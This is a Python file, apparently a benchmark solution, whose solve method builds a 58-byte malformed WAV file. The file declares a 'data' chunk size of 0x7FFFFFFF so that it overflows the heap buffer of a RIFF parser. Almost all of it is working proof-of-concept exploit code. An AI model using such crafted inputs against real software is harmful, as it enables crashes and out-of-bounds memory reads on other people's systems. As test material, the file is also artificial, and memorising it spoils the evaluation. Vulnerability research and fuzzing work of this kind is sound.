import struct

class Solution:
    """
    Generates a Proof-of-Concept input for a Heap Buffer Overflow in a RIFF parser.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a malformed RIFF/WAVE file to trigger the vulnerability.

        The vulnerability occurs when a sub-chunk's declared size is larger than
        the remaining size of the parent RIFF chunk, leading to an out-of-bounds read.

        The PoC is a 58-byte WAV file structured as follows:
        1. A standard RIFF header.
        2. A valid 'fmt ' chunk to ensure parsing continues to the next chunk.
        3. A 'data' chunk with a very large declared size (0x7FFFFFFF).
        4. The actual file ends shortly after this malicious size field, ensuring
           that the amount of data to be read is far greater than what's available
           within the parent RIFF chunk's bounds.
        5. Some trailing data bytes are included to match the ground-truth PoC length
           and bypass potential preliminary checks that might exit early if no data
           follows the malicious chunk header.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that triggers the heap buffer overflow.
        """
        
        # Use bytearray for efficient construction
        poc = bytearray()
        
        # RIFF header
        poc.extend(b'RIFF')
        
        # Placeholder for the main chunk size. It will be calculated and patched later.
        # This size is for all data following this field.
        main_size_offset = len(poc)
        poc.extend(b'\x00\x00\x00\x00')
        
        # WAVE form type identifier
        poc.extend(b'WAVE')
        
        # 'fmt ' sub-chunk (standard audio format information)
        poc.extend(b'fmt ')
        fmt_chunk_data_size = 16  # Standard size for PCM format data
        poc.extend(struct.pack('<I', fmt_chunk_data_size))
        poc.extend(b'\x00' * fmt_chunk_data_size)  # Dummy format data
        
        # 'data' sub-chunk (the malicious part)
        poc.extend(b'data')
        
        # A very large, malicious size that exceeds the file and chunk boundaries.
        malicious_data_size = 0x7FFFFFFF
        poc.extend(struct.pack('<I', malicious_data_size))
        
        # Add a few bytes of data. This helps bypass simple checks and ensures
        # we match the 58-byte ground-truth PoC length.
        # Current length: 4(RIFF) + 4(size) + 4(WAVE) + 4(fmt) + 4(size) + 16(data) + 4(data_id) + 4(size) = 44 bytes.
        # To reach 58 bytes, we need 14 more bytes.
        poc.extend(b'\x00' * 14)
        
        # Calculate the correct main chunk size: total length - 8 bytes ('RIFF' and size field)
        main_chunk_size = len(poc) - 8
        
        # Patch the main chunk size at its offset
        poc[main_size_offset:main_size_offset+4] = struct.pack('<I', main_chunk_size)
        
        return bytes(poc)